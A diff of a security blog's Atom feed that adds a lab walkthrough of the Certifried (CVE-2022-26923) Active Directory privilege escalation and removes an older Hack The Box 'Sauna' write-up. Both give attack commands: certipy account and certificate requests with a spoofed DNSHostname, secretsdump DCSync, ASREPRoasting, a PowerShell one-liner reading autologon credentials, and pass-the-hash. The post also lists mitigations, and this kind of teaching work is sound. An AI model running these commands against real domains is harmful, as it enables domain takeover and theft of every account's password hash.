@@ -1,4 +1,91 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-05-07T22:40:23+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="https://omnisl4sh.github.io/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/07/Cascade</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="https://omnisl4sh.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://omnisl4sh.github.io/" rel="alternate" type="text/html" /><updated>2022-05-13T14:14:27+02:00</updated><id>https://omnisl4sh.github.io/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)</title><link href="https://omnisl4sh.github.io/2022/05/13/Certifried.html" rel="alternate" type="text/html" title="AD Pentesting | Domain Privesc - Certifried (CVE-2022-26923)" /><published>2022-05-13T00:00:00+02:00</published><updated>2022-05-13T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/13/Certifried</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/13/Certifried.html"><![CDATA[<p><img src="/assets/Certifried/Certifried-diagram.jpg" alt="Certifried-diagram" /></p>
+
+<h1 id="the-attack-in-brief">The Attack In Brief</h1>
+<ol>
+  <li>AD Certificates can be used for authentication.</li>
+  <li>Certificates can be generated from <strong>templates</strong> in a <strong>Certificate Signing Request</strong> (CSR).</li>
+  <li>There are <strong>two</strong> types of templates available in <strong>ADCS</strong> by default: User and Computer.</li>
+  <li>Those templates are <strong>accessible to anyone</strong> in the <code class="language-plaintext highlighter-rouge">Domain Users</code> or <code class="language-plaintext highlighter-rouge">Domain Computers</code> groups.</li>
+  <li>Those templates <strong>allow the certificate holder to authenticate</strong> with them.</li>
+  <li><em>When generating a certificate for a computer object</em>, the template will check its <code class="language-plaintext highlighter-rouge">DNSHostname</code> property and <strong>will generate the certificate based on that</strong>.</li>
+  <li><strong>Meaning:</strong> <em>if the computer’s</em> <code class="language-plaintext highlighter-rouge">DNSHostname</code> <em>says it’s a Domain Controller,</em> you will get a certificate for a <strong>Domain Controller!</strong></li>
+  <li><em>By default,</em> <strong>any authenticated user</strong> can join up to 10 computers to the domain.</li>
+  <li><em>When a user joins a computer to the domain,</em> he can modify its <code class="language-plaintext highlighter-rouge">DNSHostname</code> property.</li>
+  <li><em>Combining points above,</em> a user can <em>spoof</em> the <code class="language-plaintext highlighter-rouge">DNSHostname</code> to <em>forge</em> a certificate as a <strong>Domain Controller</strong>.</li>
+  <li><em>With a Domain Controller’s certificate,</em> the user <em>can obtain</em> the computer account’s <strong>NTLM</strong> hash.</li>
+  <li><em>And with that hash,</em> he can <em>impersonate</em> a legit <strong>Domain Controller</strong> and <em>request a full copy of the domain’s hashes</em> (a.k.a <strong>perform a <code class="language-plaintext highlighter-rouge">DCSync</code> attack</strong>).</li>
+</ol>
+
+<hr />
+
+<h1 id="tools-needed">Tools Needed</h1>
+<ol>
+  <li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+  <li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
+</ol>
+
+<hr />
+
+<h1 id="lab-setup-and-conditions">Lab Setup And Conditions</h1>
+<h2 id="1-domain-controller-with-adcs-role-installed-dclablocal-192168126129">1. Domain Controller with ADCS Role installed [DC.LAB.Local: 192.168.126.129]</h2>
+<p><img src="/assets/Certifried/dc-with-adcs-installed.jpg" alt="dc-with-adcs-installed" /></p>
+
+<h2 id="2-kali-192168145128">2. Kali [192.168.145.128]</h2>
+<p><img src="/assets/Certifried/kali-machine.jpg" alt="kali-machine" /></p>
+
+<h2 id="3-normal-user-account-no-special-privileges">3. Normal User Account (No Special Privileges)</h2>
+<p><img src="/assets/Certifried/normal-ad-user.jpg" alt="normal-ad-user" /></p>
+
+<hr />
+
+<h1 id="attack-demonstration">Attack Demonstration</h1>
+<h2 id="1-joining-a-machine-account-to-the-domain-with-a-spoofed-dnshostname">1. Joining A Machine Account to The Domain with A Spoofed <code class="language-plaintext highlighter-rouge">DNSHostname</code></h2>
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy account create &lt;DOMAIN_FQDN&gt;/&lt;AD_USER&gt;@&lt;DC_IP&gt; -user '&lt;NEW_COMPUTER_NAME&gt;' -dns &lt;DC_FQDN&gt;</code></p>
+
+<p><img src="/assets/Certifried/creating-computer-with-spoofed-dns-hostname.jpg" alt="creating-computer-with-spoofed-dns-hostname" /></p>
+
+<p><img src="/assets/Certifried/proof-of-dns-hostname-spoofing.jpg" alt="proof-of-dns-hostname-spoofing" /></p>
+
+<h2 id="2-requesting-a-domain-controllers-certificate">2. Requesting A Domain Controller’s Certificate</h2>
+<p>we must first obtain the certificate authority’s name.</p>
+
+<p>This can be done by visiting the <code class="language-plaintext highlighter-rouge">/certsrv</code> web directory on the server with ADCS installed and authenticating.</p>
+
+<p><img src="/assets/Certifried/finding-out-the-ca-name.jpg" alt="finding-out-the-ca-name" /></p>
+
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy req -dc-ip &lt;DC_IP&gt; &lt;DOMAIN_FQDN&gt;/'&lt;ADDED_COMPUTER_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -ca &lt;CA_NAME&gt; -template Machine</code></p>
+
+<p>Pssword = the same password generated from the computer creation in the previous step</p>
+
+<p><img src="/assets/Certifried/requesting-dc-cert.jpg" alt="requesting-dc-cert" /></p>
+
+<h2 id="3-using-the-domain-controllers-certificate-to-get-its-ntlm-hash">3. Using the Domain Controller’s Certificate To Get its NTLM Hash</h2>
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">certipy auth -pfx &lt;GENERATED_PFX_CERTIFICATE&gt;</code></p>
+
+<p><img src="/assets/Certifried/got-nt-hash-for-dc.jpg" alt="got-nt-hash-for-dc" /></p>
+
+<h2 id="4-performing-dcsync-as-the-impersonated-domain-controller">4. Performing <code class="language-plaintext highlighter-rouge">DCsync</code> As The Impersonated Domain Controller</h2>
+<p><strong>Command:</strong> <code class="language-plaintext highlighter-rouge">secretsdump.py -just-dc &lt;DOMAIN_FQDN&gt;/'&lt;DC_NAME_ENDING_WITH_DOLLAR_SIGN&gt;'@&lt;DC_IP&gt; -hashes :&lt;RETRIEVED_HASH&gt;</code></p>
+
+<p><img src="/assets/Certifried/dc-sync-with-dc-ntlm-hash.jpg" alt="dc-sync-with-dc-ntlm-hash" /></p>
+
+<hr />
+
+<h1 id="mitigation">Mitigation</h1>
+<ol>
+  <li>Applying the patch released by Microsoft <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923">here</a>.</li>
+  <li>Reducing certificate template permissions.</li>
+  <li>Reducing the default user’s machine quota to zero. Only Administrators should have this privilege.</li>
+</ol>
+
+<hr />
+
+<h1 id="references-and-credits">References and Credits</h1>
+<ul>
+  <li><strong>Will Schroeder</strong> and <strong>Lee Christensen</strong> who wrote the paper that started it all <a href="https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf">here</a></li>
+  <li><a href="https://twitter.com/ly4k_">Oliver Lyak</a> who discovered and reported the vulnerability and created the <code class="language-plaintext highlighter-rouge">Certipy</code> tool.</li>
+  <li><strong>SecureAuthCorp</strong> for the awesome <strong>Impacket</strong> scripts of course :D</li>
+</ul>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)</title><link href="https://omnisl4sh.github.io/2022/05/07/Cascade.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Medium] - Cascade (AD Pentesting Track #9)" /><published>2022-05-07T00:00:00+02:00</published><updated>2022-05-07T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/05/07/Cascade</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/05/07/Cascade.html"><![CDATA[<p><img src="/assets/Cascade/Cascade.png" alt="Cascade" /></p>
 
 <h3 id="summary">Summary</h3>
 <ul>
@@ -2612,250 +2699,4 @@ Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.lo
 
 <p><em>Using the administrator NTLM hash,</em> we can use <code class="language-plaintext highlighter-rouge">evil-winrm</code> to remote inside and we’re done with the box :D</p>
 
-<p><img src="/assets/Forest/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HTB Writeup [Windows - Easy] - Sauna (AD Pentesting Track #2)</title><link href="https://omnisl4sh.github.io/2022/04/08/Sauna.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Easy] - Sauna (AD Pentesting Track #2)" /><published>2022-04-08T00:00:00+02:00</published><updated>2022-04-08T00:00:00+02:00</updated><id>https://omnisl4sh.github.io/2022/04/08/Sauna</id><content type="html" xml:base="https://omnisl4sh.github.io/2022/04/08/Sauna.html"><![CDATA[<p><img src="/assets/Sauna/Sauna.png" alt="Sauna" /></p>
-
-<h3 id="summary">Summary</h3>
-<ul>
-  <li>We find a <strong>domain controller</strong> with <strong>IIS</strong> running on port 80.</li>
-  <li>It turns out to be the <strong>company website</strong> and we create a <strong>list of usernames</strong> from the <strong>‘Meet the Team’ page</strong>.</li>
-  <li>We try <strong>ASREPRoasing</strong> and get <strong>creds for a user with PowerShell Remoting capabilities</strong>.</li>
-  <li><em>Enumerating Autologon,</em> we find <strong>creds for another user</strong> with <strong>DCSync</strong> privileges which we use to <strong>dump all domain NTLM hashes</strong>.</li>
-</ul>
-
-<hr />
-
-<h3 id="nmap">Nmap</h3>
-<p>We start off with an <code class="language-plaintext highlighter-rouge">nmap</code> scan for <code class="language-plaintext highlighter-rouge">all ports</code> and using <code class="language-plaintext highlighter-rouge">service detection</code> and <code class="language-plaintext highlighter-rouge">default scripts</code></p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-|_http-title: Egotistical Bank :: Home
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-08 21:43:07Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp  open  mc-nmf        .NET Message Framing
-49668/tcp open  msrpc         Microsoft Windows RPC
-49673/tcp open  msrpc         Microsoft Windows RPC
-49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49676/tcp open  msrpc         Microsoft Windows RPC
-49699/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-|_clock-skew: 7h00m00s
-| smb2-time: 
-|   date: 2022-04-08T21:44:00
-|_  start_date: N/A
-| smb2-security-mode: 
-|   3.1.1: 
-|_    Message signing enabled and required
-</code></pre></div></div>
-<p><em>Right off the bat,</em> we see <code class="language-plaintext highlighter-rouge">IIS 10.0</code> on port 80 which indicates either Windows Server 2016 or 2019.
-We also see a collection of ports (DNS, Kerberos, LDAP, SMB, Secure LDAP and WinRM) along with <code class="language-plaintext highlighter-rouge">nmap</code> telling us that this box is more likely a <strong>Domain Controller</strong>. The domain name is <code class="language-plaintext highlighter-rouge">EGOTISTICAL-BANK.LOCAL</code></p>
-
-<h3 id="basic-osint-pulling-usernames-from-the-website-and-wordlist-generation">Basic OSINT: Pulling usernames from the website and Wordlist Generation</h3>
-
-<p>we go and check out the website. And, we find mostly static content there that doesn’t give us much indication of an exploit. <em>However,</em> we do find a couple of potential usernames in the <code class="language-plaintext highlighter-rouge">/about.html</code> page at the bottom:</p>
-
-<p><img src="/assets/Sauna/meet-the-team.jpg" alt="meet-the-team" /></p>
-
-<p>we can use those to generate a wordlist to try against kerberos for user enumeration. <em>using a quick</em> <code class="language-plaintext highlighter-rouge">python</code> <em>script</em> (https://github.com/w0Tx/generate-ad-username), we generate a userlist like this:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...SNIP...
-fergussmith
-fergus-smith
-fergus.smith
-fersmi
-fer-smi
-fer.smi
-fsmith
-f-smith
-f.smith
-smithfergus
-smith-fergus
-smith.fergus
-smifer
-smi-fer
-smi.fer
-sfergus
-s-fergus
-s.fergus
-smithf
-smith-f
-...SNIP...
-</code></pre></div></div>
-
-<p>this is based on <strong>commonly-used username schemes</strong>:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NameSurname
-Name.Surname
-NamSur (3letters of each)
-Nam.Sur
-NSurname
-N.Surname
-SurnameName
-Surname.Name
-SurnameN
-Surname.N
-</code></pre></div></div>
-
-<h3 id="user-enumeration-using-kerbrute">User Enumeration using <code class="language-plaintext highlighter-rouge">kerbrute</code></h3>
-
-<p><em>using</em> <code class="language-plaintext highlighter-rouge">kerbrute</code> <em>for user enumeration,</em> we find that the user <code class="language-plaintext highlighter-rouge">fsmith</code> exists:</p>
-
-<p><img src="/assets/Sauna/fsmith-exists.jpg" alt="fsmith-exists" /></p>
-
-<h3 id="asreproast-attack">ASREPRoast Attack</h3>
-
-<p><em>Having only this one user,</em> we decide to <code class="language-plaintext highlighter-rouge">ASREPRoast</code> him to see if he doesn’t have <code class="language-plaintext highlighter-rouge">Kerberos Pre-Authentication</code> enabled. And he does! :D</p>
-
-<p><img src="/assets/Sauna/ASREP-roasted.jpg" alt="ASREP-roasted" /></p>
-
-<p>we go on and crack the hash using <code class="language-plaintext highlighter-rouge">john</code>. The password turns out to be <code class="language-plaintext highlighter-rouge">Thestrokes23</code></p>
-
-<p><img src="/assets/Sauna/fsmith-cracked.jpg" alt="fsmith-cracked" /></p>
-
-<p>The wordlist I used <code class="language-plaintext highlighter-rouge">gegalist.txt</code> is just a combination of all the wordlists in <strong>Seclists</strong>.</p>
-
-<h3 id="powershell-remoting-with-fsmith">PowerShell Remoting with <code class="language-plaintext highlighter-rouge">fsmith</code></h3>
-
-<p>we want to get <strong>remote code execution</strong> on the box, so we try <strong>PowerShell Remoting</strong> using a tool called <code class="language-plaintext highlighter-rouge">evil-winrm</code> (https://github.com/Hackplayers/evil-winrm). And are lucky :D</p>
-
-<p><img src="/assets/Sauna/we-can-winrm.jpg" alt="we-can-winrm" /></p>
-
-<h3 id="autologon-creds-for-svc_loanmgr">Autologon creds for <code class="language-plaintext highlighter-rouge">svc_loanmgr</code></h3>
-
-<p><em>Looking around the box in the user profile and in the root directory,</em> we don’t see much intersting information. <em>However, when we check for autlogon creds,</em> we do find interesting credentials for the <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> user:</p>
-
-<p>My <strong>PowerShell one-liner</strong>:</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ErrorActionPreference='SilentlyContinue';'DefaultDomainName', 'DefaultUserName', 'DefaultPassword', 'AltDefaultDomainName', 'AltDefaultUserName', 'AltDefaultPassword' | % {$Val = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name $_ ;if($Val){Write-Host -ForegroundColor Green "[+] $_`: $Val"; Clear-Variable Val}else{Write-Host "[-] $_`: Not found"}}
-</code></pre></div></div>
-
-<p><img src="/assets/Sauna/Autologon-creds.jpg" alt="Autologon-creds" /></p>
-
-<p>This is amazing :D we now got two accounts!</p>
-
-<h3 id="enumeration-with-bloodhound">Enumeration with <code class="language-plaintext highlighter-rouge">BloodHound</code></h3>
-
-<p><em>Since this is an AD environment,</em> it’s only natural that we run <code class="language-plaintext highlighter-rouge">BloodHound</code>. <em>This time,</em> we’re going to use a python-based version called <code class="language-plaintext highlighter-rouge">bloodhound-python</code> (https://github.com/fox-it/BloodHound.py).</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─# bloodhound-python -u fsmith@EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL -v -c All
-Password:
-DEBUG: Resolved collection methods: dcom, objectprops, acl, trusts, session, localadmin, psremote, rdp, group
-DEBUG: Using DNS to retrieve domain information
-DEBUG: Querying domain controller information from DNS
-DEBUG: Using domain hint: EGOTISTICAL-BANK.LOCAL
-INFO: Found AD domain: egotistical-bank.local
-DEBUG: Found primary DC: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Found Global Catalog server: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Using LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Using base DN: DC=egotistical-bank,DC=local
-INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Authenticating to LDAP server
-DEBUG: No LAPS attributes found in schema
-DEBUG: Found KeyCredentialLink attributes in schema
-INFO: Found 1 domains
-INFO: Found 1 domains in the forest
-INFO: Found 1 computers
-DEBUG: Writing users to file: 20220408174125_users.json
-INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Authenticating to LDAP server
-DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-512
-DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-526
-DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-527
-DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-519
-INFO: Found 7 users
-DEBUG: Finished writing users
-DEBUG: Writing groups to file: 20220408174125_groups.json
-INFO: Connecting to GC LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Authenticating to LDAP server
-DEBUG: Querying GC for DN CN=Group Policy Creator Owners,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=Domain Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=Cert Publishers,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=Enterprise Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=Schema Admins,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=Domain Controllers,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
-DEBUG: Querying GC for DN CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
-INFO: Found 52 groups
-DEBUG: Finished writing groups
-DEBUG: Opening file for writing: 20220408174125_domains.json
-DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-1108
-DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-498
-DEBUG: Querying resolver LDAP for SID S-1-5-21-2966785786-3096785034-1186376766-516
-INFO: Found 0 trusts
-DEBUG: Finished writing domain info
-INFO: Starting computer enumeration with 10 workers
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-DEBUG: Start working
-INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: Resolved: 10.10.10.175
-DEBUG: Trying connecting to computer: SAUNA.EGOTISTICAL-BANK.LOCAL
-DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\srvsvc]
-DEBUG: Access denied while enumerating Sessions on SAUNA.EGOTISTICAL-BANK.LOCAL, likely a patched OS
-DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
-DEBUG: Opening domain handle
-DEBUG: Found 544 SID: S-1-5-21-2966785786-3096785034-1186376766-500
-DEBUG: Found 544 SID: S-1-5-21-2966785786-3096785034-1186376766-519
-DEBUG: Sid is cached: ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL
-DEBUG: Found 544 SID: S-1-5-21-2966785786-3096785034-1186376766-512
-DEBUG: Sid is cached: DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL
-DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\lsarpc]
-DEBUG: Resolved SID to name: ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL
-DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
-DEBUG: Opening domain handle
-DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
-DEBUG: Opening domain handle
-DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\samr]
-DEBUG: Opening domain handle
-DEBUG: Found 580 SID: S-1-5-21-2966785786-3096785034-1186376766-1105
-DEBUG: Found 580 SID: S-1-5-21-2966785786-3096785034-1186376766-1108
-DEBUG: Sid is cached: SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL
-DEBUG: DCE/RPC binding: ncacn_np:10.10.10.175[\PIPE\lsarpc]
-DEBUG: Resolved SID to name: FSMITH@EGOTISTICAL-BANK.LOCAL
-DEBUG: Write worker obtained a None value, exiting
-DEBUG: Write worker is done, closing files
-INFO: Done in 00M 28S
-</code></pre></div></div>
-<p>this leaves us a couple of <code class="language-plaintext highlighter-rouge">.json</code> files which we can zip before uploading to <code class="language-plaintext highlighter-rouge">bloodhound</code></p>
-
-<p><img src="/assets/Sauna/Zipping-them-jsons.jpg" alt="Zipping-them-jsons" /></p>
-
-<h3 id="abusing-dangerous-rights-dcsync">Abusing Dangerous Rights (DCSync)</h3>
-
-<p><em>trying a standard</em> <code class="language-plaintext highlighter-rouge">bloodhound</code> <em>query,</em> we find that the user that own <code class="language-plaintext highlighter-rouge">svc_loanmgr</code> happens to have a very dangerous right <code class="language-plaintext highlighter-rouge">DCSync</code> on the domain.</p>
-
-<p><img src="/assets/Sauna/dc-sync-for-loanmgr.jpg" alt="dc-sync-for-loanmgr" /></p>
-
-<p>Having this right means we can act as if we were <em>another domain controller</em> and ask for a <strong>full synchronization of all the password hashes of the domain.</strong></p>
-
-<h3 id="full-domain-hash-dump">Full domain hash dump</h3>
-
-<p>This can be achieved using <code class="language-plaintext highlighter-rouge">impacket</code>’s <code class="language-plaintext highlighter-rouge">secretsdump.py</code> tool:</p>
-
-<p><img src="/assets/Sauna/secrets-dump.jpg" alt="secrets-dump" /></p>
-
-<p><em>With the</em> <code class="language-plaintext highlighter-rouge">administrator</code>‘<em>s hash,</em> we can easily get a shell on the box using <code class="language-plaintext highlighter-rouge">evil-winrm</code>’s <code class="language-plaintext highlighter-rouge">-H</code> flag to run what’s called a <code class="language-plaintext highlighter-rouge">pass-the-hash</code> attack.</p>
-
-<p><img src="/assets/Sauna/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
+<p><img src="/assets/Forest/got-admin.jpg" alt="got-admin" /></p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
